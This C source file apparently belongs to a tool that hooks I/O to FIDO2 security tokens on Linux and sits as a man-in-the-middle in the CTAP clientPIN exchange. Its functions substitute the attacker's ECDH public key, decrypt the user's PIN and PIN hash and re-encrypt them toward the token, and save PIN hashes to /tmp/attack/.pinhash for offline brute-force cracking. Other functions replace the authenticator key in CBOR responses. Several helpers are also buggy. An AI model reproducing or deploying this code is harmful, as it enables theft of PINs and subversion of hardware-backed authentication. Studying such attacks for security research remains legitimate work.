#include "utils.h"
#include "cbor.h"
#include "../utils/es256.h"

#if !defined(HAVE_RECALLOCARRAY)

/*
 * This is sqrt(SIZE_MAX+1), as s1*s2 <= SIZE_MAX
 * if both s1 < MUL_NO_OVERFLOW and s2 < MUL_NO_OVERFLOW
 */

void *
recallocarray(void *ptr, size_t oldnmemb, size_t newnmemb, size_t size)
{
	size_t oldsize, newsize;
	void *newptr;

	if (ptr == NULL)
		return calloc(newnmemb, size);

	if ((newnmemb >= MUL_NO_OVERFLOW || size >= MUL_NO_OVERFLOW) &&
	    newnmemb > 0 && SIZE_MAX / newnmemb < size) {
		errno = ENOMEM;
		return NULL;
	}
	newsize = newnmemb * size;

	if ((oldnmemb >= MUL_NO_OVERFLOW || size >= MUL_NO_OVERFLOW) &&
	    oldnmemb > 0 && SIZE_MAX / oldnmemb < size) {
		errno = EINVAL;
		return NULL;
	}
	oldsize = oldnmemb * size;
	
	/*
	 * Don't bother too much if we're shrinking just a bit,
	 * we do not shrink for series of small steps, oh well.
	 */
	if (newsize <= oldsize) {
		size_t d = oldsize - newsize;

		if (d < oldsize / 2 && d < (size_t)getpagesize()) {
			memset((char *)ptr + newsize, 0, d);
			return ptr;
		}
	}

	newptr = malloc(newsize);
	if (newptr == NULL)
		return NULL;

	if (newsize > oldsize) {
		memcpy(newptr, ptr, oldsize);
		memset((char *)newptr + oldsize, 0, newsize - oldsize);
	} else
		memcpy(newptr, ptr, newsize);

	explicit_bzero(ptr, oldsize);
	free(ptr);

	return newptr;
}

#endif

int intToString (int value, char* result) {

    int length = sizeof(result);
    snprintf( result, length, "%d", value );

    return length;
}

void printUnsignedChar (const unsigned char* data, ssize_t len, unsigned char* delimiter) {

    if (delimiter == NULL) {
        delimiter = " ";
    }

#ifdef ATTACK_LOG

    for (int i = 0; i < len; i++) {
        attack_log("%u ", data[i]);
    }

#endif

}

int file_exists_v2(char* filename) {
    
    FILE* file = fopen(filename, "r");

    if (file == NULL)
        return 0;
    
    fclose(file);

    return 1;

}

int file_exists(char* filename) {

    return ( access(filename, F_OK) == 0 );

}

int replace_authkey (unsigned char* cbor_data, size_t cbor_data_len, es256_pk_t *pk_for_libfido, unsigned char* new_cbor_data) {

    cbor_item_t *cbor_map = NULL;
    struct cbor_load_result	clr;
    size_t cbor_alloc_len;
    unsigned char	*cbor = NULL;

    if ( (cbor_map = cbor_load(cbor_data + 1, cbor_data_len - 1, &clr)) == NULL ) {

        attack_log("FAILED TO LOAD MAP!\n");
        return -1;
    }
        
    
    if (cbor_isa_map(cbor_map) == false ||
	    cbor_map_is_definite(cbor_map) == false) {

        attack_log("FAILED BECAUSE THE LOADED MAP IS NOT A MAP\n\n");
		return -1;
	}

    struct cbor_pair *elements = cbor_map_handle(cbor_map);

    cbor_item_t *newValue = es256_pk_encode_mod(pk_for_libfido, 1);

    unsigned char* serialized_key = NULL;

    size_t len = cbor_serialize_alloc(newValue, &serialized_key, &cbor_alloc_len);

    if (newValue == NULL)
        return -1;

    elements[0].value = newValue;

    cbor_serialize_alloc(cbor_map, &cbor, &cbor_alloc_len);

    //the first byte corresponding to the reponse code from the token
    new_cbor_data[0] = cbor_data[0];
    memcpy(new_cbor_data + 1, cbor, cbor_data_len - 1);

    return 0;
}

static int
tx_pkt(state_helper_t *d, const void *pkt, size_t len, int *ms)
{

	struct timespec ts;
	int n;

    if (d->bad_token_dev == NULL) {
        return real_write(d->fd, pkt, len);
    }

	if (fido_time_now(&ts) != 0)
		return (-1);

	n = d->bad_token_dev->io.write(d->bad_token_dev->io_handle, pkt, len);

	if (fido_time_delta(&ts, ms) != 0)
		return (-1);

	return (n);
}

//64 is hardcoded if dev is NULL since it is the usual size of packet (+1)
static size_t
tx_preamble(state_helper_t* d, uint8_t cmd, const void *buf, size_t count, int *ms,
    int (*real_write)(int fd, const void *buf, size_t count))
{
    const size_t tx_len = (d->bad_token_dev == NULL) ? 64 : d->bad_token_dev->tx_len;

	frame_t *fp;
	unsigned char	 pkt[sizeof(*fp) + 1];
	const size_t	 len = tx_len + 1;
	int		 n;

	if (tx_len - CTAP_INIT_HEADER_LEN > sizeof(fp->body.init.data))
		return (0);

	memset(&pkt, 0, sizeof(pkt));
	fp = (struct frame *)(pkt + 1);
	fp->cid = d->cid;
	fp->body.init.cmd = CTAP_FRAME_INIT | cmd;
	fp->body.init.bcnth = (count >> 8) & 0xff;
	fp->body.init.bcntl = count & 0xff;
	count = MIN(count, tx_len - CTAP_INIT_HEADER_LEN);
	memcpy(&fp->body.init.data, buf, count);

	if (len > sizeof(pkt) || (n = tx_pkt(d, pkt, len, ms)) < 0 ||
	    (size_t)n != len)
		return (0);

	return (count);
}

static size_t
tx_frame(state_helper_t *d, uint8_t seq, const void *buf, size_t count, int *ms,
    int (*real_write)(int fd, const void *buf, size_t count))
{
    const size_t tx_len = (d->bad_token_dev == NULL) ? 64 : d->bad_token_dev->tx_len;

	frame_t	*fp;
	unsigned char	 pkt[sizeof(*fp) + 1];
	const size_t	 len = tx_len + 1;
	int		 n;

	if (tx_len - CTAP_CONT_HEADER_LEN > sizeof(fp->body.cont.data))
		return (0);

	memset(&pkt, 0, sizeof(pkt));
	fp = (struct frame *)(pkt + 1);
	fp->cid = d->cid;
	fp->body.cont.seq = seq;
	count = MIN(count, tx_len - CTAP_CONT_HEADER_LEN);
	memcpy(&fp->body.cont.data, buf, count);

	if (len > sizeof(pkt) || (n = tx_pkt(d, pkt, len, ms)) < 0 ||
	    (size_t)n != len)
		return (0);

	return (count);
}

int
send_frames(state_helper_t *d, uint8_t cmd, const unsigned char *buf, size_t count, int *ms,
    int (*real_write)(int fd, const void *buf, size_t count))
{
	size_t n, sent;
    int frames_sent = 0;

	if ((sent = tx_preamble(d, cmd, buf, count, ms, real_write)) == 0) {
		return (-1);
	}

    frames_sent++;

	for (uint8_t seq = 0; sent < count; sent += n) {
		if (seq & 0x80) {
			return (-1);
		}
		if ((n = tx_frame(d, seq++, buf + sent, count - sent,
		    ms, real_write)) == 0) {
			return (-1);
		}
        frames_sent++;
	}

	return (frames_sent);
}


static int
rx_frame(state_helper_t *d, struct frame *fp, int *ms,
    int (*real_read)(int fd, void *buf, size_t count))
{
	struct timespec ts;
	int n;

	memset(fp, 0, sizeof(*fp));

    usleep(100000);

	if (64 > sizeof(*fp) || (n = real_read(d->fd, (unsigned char *)fp, 64)) < 0 || (size_t)n != 64)
		return (-1);

	return 0;
}

static int
rx_preamble(state_helper_t *d, uint8_t cmd, struct frame *fp, int *ms,
    int (*real_read)(int fd, void *buf, size_t count))
{

    int i = 0;

	do {


		if (rx_frame(d, fp, ms, real_read) < 0) {
            return (-1);
        }

        i++;

#ifdef FIDO_FUZZ
		fp->cid = d->cid;
#endif
	} while (fp->cid != d->cid || (fp->cid == d->cid &&
	    fp->body.init.cmd == (CTAP_FRAME_INIT | CTAP_KEEPALIVE)));

	

	if (64 > sizeof(*fp))
		return (-1);

#ifdef FIDO_FUZZ
	fp->body.init.cmd = (CTAP_FRAME_INIT | cmd);
#endif

	if (fp->cid != d->cid || fp->body.init.cmd != (CTAP_FRAME_INIT | cmd)) {
        attack_log("Need attention here in rx_preamble!\n");
        attack_log("fp->cid: %d\n", fp->cid);
        attack_log("d->cid: %d\n", d->cid);
        attack_log("init.cmd: %d\n", fp->body.init.cmd);
        attack_log("cmd: %d\n", cmd);
		return (-1);
	}

	return (0);
}

int
read_frames(state_helper_t *d, uint8_t cmd, unsigned char *buf, size_t count, int *ms,
    int (*real_read)(int fd, void *buf, size_t count))
{
	struct frame f;
	size_t r, payload_len, init_data_len, cont_data_len;

	init_data_len = 64 - CTAP_INIT_HEADER_LEN;
	cont_data_len = 64 - CTAP_CONT_HEADER_LEN;

	if (init_data_len > sizeof(f.body.init.data) ||
	    cont_data_len > sizeof(f.body.cont.data))
		return (-1);

	if (rx_preamble(d, cmd, &f, ms, real_read) < 0) {
		return (-1);
	}

	d->frame_count = 0;
	memcpy(&(d->frames[0]), &f, sizeof(f));
	d->frame_count++;

	payload_len = (size_t)((f.body.init.bcnth << 8) | f.body.init.bcntl);
	

	if (count < payload_len) {
		return (-1);
	}

	if (payload_len < init_data_len) {
		memcpy(buf, f.body.init.data, payload_len);
		return ((int)payload_len);
	}

	memcpy(buf, f.body.init.data, init_data_len);
	r = init_data_len;

	for (int seq = 0; r < payload_len; seq++) {
		if (rx_frame(d, &f, ms, real_read) < 0) {
			return (-1);
		}

#ifdef FIDO_FUZZ
		f.cid = d->cid;
		f.body.cont.seq = (uint8_t)seq;
#endif

		if (f.cid != d->cid || f.body.cont.seq != seq) {
			return (-1);
		}

		memcpy(&(d->frames[seq + 1]), &f, sizeof(f));
		d->frame_count++;

		if (payload_len - r > cont_data_len) {
			memcpy(buf + r, f.body.cont.data, cont_data_len);
			r += cont_data_len;
		} else {
			memcpy(buf + r, f.body.cont.data, payload_len - r);
			r += payload_len - r; /* break */
		}
	}

	return ((int)r);
}


int find_token_name_old (int fd, char* token_name) {

    char* fdString = malloc(snprintf( NULL, 0, "%d", fd ) + 1);

    //must free fdString after use
    intToString(fd, fdString);

    char* readlink_path = malloc(strlen("/proc/self/fd/") + strlen(fdString) + 1);

    strcpy(readlink_path, "/proc/self/fd/");

    readlink(strcat(readlink_path, fdString), token_name, sizeof(token_name));

    free(fdString);

    return 0;

}

int find_token_name_bad(int fd, char* token_name)
{
  char buf[1024] = {'\0'};
  snprintf(buf, sizeof (buf), "/proc/self/fd/%d", fd);
  if (readlink(buf, token_name, sizeof(token_name) - 1) != -1) {
    
    return 1;
  }

  return 0;
}

int find_token_name_meh (int fd, char* token_name) {

    struct stat *buf = (struct stat*)malloc(sizeof(struct stat));

    fstat(fd, buf);

    return 1;
}

// int find_token_name_v2 (int fd, char* token_name) {

//     if (fcntl(fd, F_GETPATH, token_name) != -1)
//     {
//         //found path
//         return 1;
//     }
//     //did not find path
//     return 0;
// }

int list_tokens(fido_dev_info_t *devlist, size_t *ndevs)
{
	const char *rp_id = NULL;
	int blobs = 0;
	int enrolls = 0;
	int keys = 0;
	int rplist = 0;
	int ch;
	int r;

	if ((r = fido_dev_info_manifest(devlist, 64, ndevs)) != FIDO_OK)
		errx(1, "fido_dev_info_manifest: %s (0x%x)", fido_strerr(r), r);

	return 0;
}

// Assumes only one token is plugged in
int get_token_path(char* token_path) {

    fido_dev_info_t *devlist;
    size_t ndevs;

    if ((devlist = fido_dev_info_new(64)) == NULL)
		errx(1, "fido_dev_info_new");
    
    int result = list_tokens(devlist, &ndevs);
    
    fido_dev_info_t *di = (&devlist[ndevs-1]);

    size_t path_length = strlen(di->path);

    attack_log("TOKEN HAS PATH %s\n", di->path);

    memcpy(token_path, di->path, path_length);

    token_path[path_length] = '\0';

    fido_dev_info_free(&devlist, ndevs);

    return path_length;
}

int get_bad_token_path(char* bad_token_path, int select_higher) {
    
    fido_dev_info_t *devlist;
    size_t ndevs;

    if ((devlist = fido_dev_info_new(64)) == NULL)
		errx(1, "fido_dev_info_new");
    
    int result = list_tokens(devlist, &ndevs);

    

    // Only one FIDO token is plugged in, so we don't do anything.
    if (ndevs < 2) {
        return -1;
    }

    int current_selected = select_higher ? 0 : 1000;

    for (size_t i = 0; i < ndevs; i++) {
		const fido_dev_info_t *di = (&devlist[i]);

        attack_log("Path: %s (%s)\n", di->path, di->product);

        int hidraw_number = atoi(&di->path[strlen(di->path) - 1]);
        if (select_higher) {
            current_selected = (hidraw_number > current_selected) ? hidraw_number : current_selected;
        }
        else {
            current_selected = (hidraw_number < current_selected) ? hidraw_number : current_selected;
        }
	}

    memcpy(bad_token_path, "/dev/hidraw", 11);
    snprintf(bad_token_path + 11, 4, "%d", current_selected);

    fido_dev_info_free(&devlist, ndevs);

    return 1;
}

int cbor_decrypt_then_encrypt (fido_blob_t* decrypt_key, fido_blob_t* encrypt_key, cbor_item_t* source, cbor_item_t** dest, int protocol) {

    if (!cbor_isa_bytestring(source) || !cbor_bytestring_is_definite(source)) {
        printf("Something went wrong when trying to process cbor_payload!\n");
        return -1;
    }

    fido_blob_t* source_blob = fido_blob_new();
    source_blob->len = cbor_bytestring_length(source);
    source_blob->ptr = calloc(1, source_blob->len);
    
    memcpy(source_blob->ptr, cbor_bytestring_handle(source), source_blob->len);

    fido_blob_t* decrypted_blob = fido_blob_new();
    int dec_result = aes256_cbc_dec(protocol, decrypt_key, source_blob, decrypted_blob);

    //save pin hash to text file so we can try brute force or dictionary attacks offline
    if (decrypted_blob->len == 16) {
        FILE* newPinFile = fopen("/tmp/attack/.pinhash", "w");
        for (int i = 0; i < decrypted_blob->len; i++) {
            if (decrypted_blob->ptr[i] == 0)
                break;
            fputc(decrypted_blob->ptr[i], newPinFile);
        }
        fclose(newPinFile);
    }

    fido_blob_t* dest_blob = fido_blob_new();
    int enc_result = aes256_cbc_enc(protocol, encrypt_key, decrypted_blob, dest_blob);

    *dest = cbor_build_bytestring(dest_blob->ptr, dest_blob->len);

    return 0;

}


fido_blob_t* modify_cbor_payload (unsigned char* cbor_payload, size_t cbor_len, fido_blob_t *shared_secret_1, state_helper_t* helper_read) {

    struct cbor_load_result	cbor_result;

    cbor_item_t *cbor_map = cbor_load(cbor_payload + 1, cbor_len -1, &cbor_result);
    struct cbor_pair* cbor_map_elements = cbor_map_handle(cbor_map);

    es256_sk_t *sk = es256_sk_new_mod();
    es256_pk_t *pk = es256_pk_new_mod();

    es256_sk_create_mod(sk);
    es256_derive_pk_mod(sk, pk);

    FILE* token_public_key_cbor_file = fopen("/tmp/attack/.token_public_key_cbor", "r");
    unsigned char* buffer = (unsigned char*)malloc(1000*sizeof(unsigned char));
    int c, n = 0;
    while ((c = fgetc(token_public_key_cbor_file)) != EOF)
    {
        buffer[n++] = (unsigned char)c;
    }
    fclose(token_public_key_cbor_file);

    unsigned char cbor_token_public_key_data[n];
    memcpy(cbor_token_public_key_data, buffer, n);
    //free(buffer);

    cbor_item_t* cbor_public_key_map = cbor_load(cbor_token_public_key_data + 1, n - 1, &cbor_result);
    

    //token public key is parsed here to token_public_key variable
    es256_pk_t *token_public_key = calloc(1, sizeof(es256_pk_t));
    es256_pk_decode_mod(cbor_map_handle(cbor_public_key_map)[0].value, token_public_key);

    //create secret_key_2
    es256_sk_t *secret_key_2 = es256_sk_new_mod();
    es256_pk_t *public_key_2 = es256_pk_new();

    es256_sk_create_mod(secret_key_2);
    es256_derive_pk_mod(secret_key_2, public_key_2);

    //derive shared secret to use with token
    fido_blob_t	*shared_secret_2 = NULL;
    int ecdh_result = do_ecdh_mod(NULL, secret_key_2, token_public_key, &shared_secret_2, cbor_get_uint8(cbor_map_elements[0].value));

    if (ecdh_result < 0) {
        printf("\nFailed to derive shared secret with token!\n");
        return NULL;
    }

    helper_read->token_shared_secret = shared_secret_2;

    attack_log("SHARED SECRET WITH TOKEN: ");
    printUnsignedChar(helper_read->token_shared_secret->ptr, helper_read->token_shared_secret->len, NULL);
    attack_log("\n\n");

    // From this point on, decrypt fields with shared secret 1, then encrypt with shared secret 2
    // Fields change based on the sub command
    
    size_t alloc_len, len;
    unsigned char* serialized_map = NULL;
    fido_blob_t* final_cbor_payload_blob = fido_blob_new();

    switch(helper_read->ctap_sub_command) {
        case CLIENT_PIN_SET_PIN:
            {
                attack_log("SET PIN TOKEN COMMAND [%d] in cbor_modify_payload!\n", helper_read->ctap_sub_command);
                //replace client public key with public key 2 (destined for the token)
                cbor_map_elements[2].value = es256_pk_encode_mod(public_key_2, 1);

                //decrypt newPinEnc then encrypt with shared secret 2
                cbor_item_t* newPinEncryptedCbor;
                cbor_decrypt_then_encrypt(shared_secret_1, shared_secret_2, cbor_map_elements[4].value, &newPinEncryptedCbor, helper_read->protocol);
                cbor_map_elements[4].value = newPinEncryptedCbor;

                fido_blob_t* newPinEncryptedBlob = fido_blob_new();
                newPinEncryptedBlob->len = cbor_bytestring_length(newPinEncryptedCbor);
                newPinEncryptedBlob->ptr = calloc(1, newPinEncryptedBlob->len);
                memcpy(newPinEncryptedBlob->ptr, cbor_bytestring_handle(newPinEncryptedCbor), newPinEncryptedBlob->len);

                cbor_map_elements[3].value = cbor_encode_pin_auth(CTAP_PIN_PROTOCOL1, shared_secret_2, newPinEncryptedBlob);

                //serialize cbor_map, fill first position with command like cbor_payload, and return
                len = cbor_serialize_alloc(cbor_map, &serialized_map, &alloc_len);

                break;
            }
        case CLIENT_PIN_CHANGE_PIN:
            {
                attack_log("CHANGE PIN COMMAND [%d] in cbor_modify_payload!\n", helper_read->ctap_sub_command);
                //replace client public key with public key 2
                cbor_map_elements[2].value = es256_pk_encode_mod(public_key_2, 1);

                //decrypt newPinEnc then encrypt with shared secret 2
                cbor_item_t* newPinEncryptedCbor;
                cbor_decrypt_then_encrypt(shared_secret_1, shared_secret_2, cbor_map_elements[4].value, &newPinEncryptedCbor, helper_read->protocol);
                cbor_map_elements[4].value = newPinEncryptedCbor;

                cbor_item_t* oldPinHashEncryptedCbor;
                cbor_decrypt_then_encrypt(shared_secret_1, shared_secret_2, cbor_map_elements[5].value, &oldPinHashEncryptedCbor, helper_read->protocol);
                cbor_map_elements[5].value = oldPinHashEncryptedCbor;

                fido_blob_t* newPinEncryptedBlob = fido_blob_new();
                newPinEncryptedBlob->len = cbor_bytestring_length(newPinEncryptedCbor);
                newPinEncryptedBlob->ptr = calloc(1, newPinEncryptedBlob->len);
                memcpy(newPinEncryptedBlob->ptr, cbor_bytestring_handle(newPinEncryptedCbor), newPinEncryptedBlob->len);

                fido_blob_t* oldPinHashEncryptedBlob = fido_blob_new();
                oldPinHashEncryptedBlob->len = cbor_bytestring_length(oldPinHashEncryptedCbor);
                oldPinHashEncryptedBlob->ptr = calloc(1, oldPinHashEncryptedBlob->len);
                memcpy(oldPinHashEncryptedBlob->ptr, cbor_bytestring_handle(oldPinHashEncryptedCbor), oldPinHashEncryptedBlob->len);

                cbor_map_elements[3].value = cbor_encode_change_pin_auth(CTAP_PIN_PROTOCOL1, shared_secret_2, newPinEncryptedBlob, oldPinHashEncryptedBlob);

                //serialize cbor_map, fill first position with command like cbor_payload, and return
                len = cbor_serialize_alloc(cbor_map, &serialized_map, &alloc_len);

                break;
            }
        
        case CLIENT_PIN_GET_PIN_TOKEN:
        case CLIENT_PIN_GET_PIN_TOKEN_PIN:
        case CLIENT_PIN_GET_PIN_TOKEN_UV:
        {
            attack_log("GET PIN TOKEN COMMAND [%d] in cbor_modify_payload!\n", helper_read->ctap_sub_command);

            // Replace client public key with public key 2
            cbor_map_elements[2].value = es256_pk_encode_mod(public_key_2, 1);

            if (helper_read->ctap_sub_command != CLIENT_PIN_GET_PIN_TOKEN_UV) {

                // Decrypt PIN encrypted by client and re-encrypt it with new shared secret between this attacker and token
                cbor_item_t* pinEncryptedCbor;
                cbor_decrypt_then_encrypt(shared_secret_1, shared_secret_2, cbor_map_elements[3].value, &pinEncryptedCbor, helper_read->protocol);
                cbor_map_elements[3].value = pinEncryptedCbor;  

            }

            // If token supports permissions, we want to make sure it gets the Pin token for the correct RP ID.
            //cbor_map_elements[4].value = cbor_build_string("google.com");

            // Serialize cbor_map, fill first position with command like cbor_payload, and return
            len = cbor_serialize_alloc(cbor_map, &serialized_map, &alloc_len);

            break;
        }
        
        default:
            break;
    }

    // cbor_describe(cbor_map, stdout);
    // fflush(stdout);

    // len = alloc_len;

    final_cbor_payload_blob->len = sizeof(unsigned char) * (len + 1);
    final_cbor_payload_blob->ptr = (unsigned char*)malloc(final_cbor_payload_blob->len);
    final_cbor_payload_blob->ptr[0] = cbor_payload[0];
    memcpy(final_cbor_payload_blob->ptr + 1, serialized_map, len);

    return final_cbor_payload_blob;

}


int hook_this_write(int fd, size_t count) {

    frame_t *fp;
    
    return count == sizeof(*fp) + 1 && is_fido(fd);
}

int hook_this_read_v4 (int fd, size_t count) {
    return file_exists("/tmp/attack/.swap_helper") && is_fido(fd);
}

int hook_this_read_v3 (int fd, size_t count) {
    return (count == 64 || fd > 40) && is_fido(fd);
}

int hook_this_read_v2(int fd, size_t count) {

    int response = file_exists("/tmp/attack/.attack_helper") && is_fido(fd);

    return response;
}


int hook_this_read_v1(int fd, size_t count) {    
    
    if (!file_exists("/tmp/attack/.hook_next_read"))
        return 0;

    FILE *file = fopen("/tmp/attack/.hook_next_read", "r");

    state_helper_t *helper_read = (state_helper_t *)malloc(sizeof(state_helper_t));
    fread(helper_read, sizeof(state_helper_t), 1, file);
    fclose(file);

    int hook = fd == helper_read->fd;

    return hook;
}

void printFrame (frame_t *fp, int count) {

#ifdef ATTACK_LOG
    attack_log("FRAME %d\n", count);
    attack_log("CID: %u\n", fp->cid);
    attack_log("Body.Type: %d\n", fp->body.type);

    if (count == 0) {
        attack_log("Body.Init.CMD: %d\n", fp->body.init.cmd);
        attack_log("Body.Init.bcnth: %d\n", fp->body.init.bcnth);
        attack_log("Body.Init.bcntl: %d\n", fp->body.init.bcntl);
        attack_log("Body.Init.Data: ");
        for (int i = 0; i < sizeof(fp->body.init.data); i++) {
            attack_log("%u ", fp->body.init.data[i]);
        }
        attack_log("\n\n");
    }
    else {
        attack_log("Body.Cont.seq: %d\n", fp->body.cont.seq);
        attack_log("Body.Cont.Data: ");
        for (int i = 0; i < sizeof(fp->body.cont.data); i++) {
            attack_log("%u ", fp->body.cont.data[i]);
        }
        attack_log("\n\n");
    }

    fflush(stdout);
#endif

}

int msleep(long msec)
{
    struct timespec ts;
    int res;

    if (msec < 0)
    {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

int
string_read(FILE *f, char **out)
{
	char *line = NULL;
	size_t linesize = 0;
	ssize_t n;

	*out = NULL;

	if ((n = getline(&line, &linesize, f)) <= 0 ||
	    (size_t)n != strlen(line)) {
		free(line);
		return (-1);
	}

	line[n - 1] = '\0'; /* trim \n */
	*out = line;

	return (0);
}

int
fido_buf_read(const unsigned char **buf, size_t *len, void *dst, size_t count)
{
	if (count > *len)
		return (-1);

	memcpy(dst, *buf, count);
	*buf += count;
	*len -= count;

	return (0);
}

int
fido_buf_write(unsigned char **buf, size_t *len, const void *src, size_t count)
{
	if (count > *len)
		return (-1);

	memcpy(*buf, src, count);
	*buf += count;
	*len -= count;

	return (0);
}

/*

Logging functions.

*/

// Print unsigned char* as hexadecimal
void xxd(const void *buf, size_t count)
{
	const uint8_t	*ptr = buf;
	size_t		 i;

	fprintf(stderr, "  ");

	for (i = 0; i < count; i++) {
		fprintf(stderr, "%02x ", *ptr++);
		if ((i + 1) % 16 == 0 && i + 1 < count)
			fprintf(stderr, "\n  ");
	}

	fprintf(stderr, "\n");
	fflush(stderr);
}

void errx(int eval, const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	if (fmt != NULL)
		vfprintf(stderr, fmt, ap);
	va_end(ap);
	fprintf(stderr, "\n");
	exit(eval);
}


void attack_log(const char *string, ...) {
    #ifdef ATTACK_LOG
    va_list ap;

	va_start(ap, string);
	if (string != NULL)
		vfprintf(stderr, string, ap);
	va_end(ap);
    #endif
}